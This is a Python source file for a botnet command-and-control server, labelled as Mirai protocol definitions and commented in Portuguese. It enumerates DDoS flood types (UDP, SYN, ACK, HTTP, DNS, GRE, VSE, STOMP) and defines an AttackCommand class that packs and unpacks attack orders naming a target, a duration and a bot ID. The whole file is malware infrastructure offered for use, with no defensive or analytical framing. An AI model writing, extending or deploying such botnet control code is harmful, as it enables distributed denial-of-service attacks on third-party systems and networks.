# cnc/protocol.py - Definições do protocolo Mirai
from enum import IntEnum
import struct
import json
from typing import Optional


class AttackType(IntEnum):
    UDP = 0
    SYN = 1
    ACK = 2
    HTTP = 3
    DNS = 4
    GREIP = 5
    GREETH = 6
    VSE = 7
    STOMP = 8


class AttackCommand:
    def __init__(self, attack_type: AttackType, target: str,
                 duration: int, bot_id: Optional[str] = None):
        self.attack_type = attack_type
        self.target = target
        self.duration = duration
        self.bot_id = bot_id

    def to_bytes(self) -> bytes:
        """Serializa comando para bytes"""
        data = {
            'type': self.attack_type.value,
            'target': self.target,
            'duration': self.duration,
            'bot_id': self.bot_id
        }
        payload = json.dumps(data).encode('utf-8')
        # Header: 4 bytes length + 1 byte tipo
        header = struct.pack('!IB', len(payload), 0x01)
        return header + payload

    @classmethod
    def from_bytes(cls, data: bytes):
        """Desserializa bytes para comando"""
        if len(data) < 5:
            raise ValueError("Dados muito curtos para AttackCommand")
        length, cmd_type = struct.unpack_from('!IB', data, 0)
        payload = data[5:5+length]
        obj = json.loads(payload.decode('utf-8'))
        return cls(
            attack_type=AttackType(obj['type']),
            target=obj['target'],
            duration=obj['duration'],
            bot_id=obj.get('bot_id')
        )

    def __repr__(self):
        return (f"AttackCommand(type={self.attack_type.name}, "
                f"target={self.target}, duration={self.duration}s)")
